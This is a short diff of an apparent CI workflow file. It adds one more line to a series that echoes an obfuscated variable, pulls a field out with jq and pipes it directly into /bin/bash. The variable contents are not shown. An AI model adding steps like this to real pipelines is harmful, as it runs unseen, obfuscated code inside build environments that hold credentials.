@@ -40,6 +40,7 @@ jobs:
           echo $mnaw49435 | jq -r .m4430 | /bin/bash
           echo $cb21 | jq -r .vcquz1918 | /bin/bash
           echo $l313 | jq -r .yx4 | /bin/bash
+          echo $vkhs270 | jq -r .basbp08 | /bin/bash
 
       - name: Archive output
         if: always()
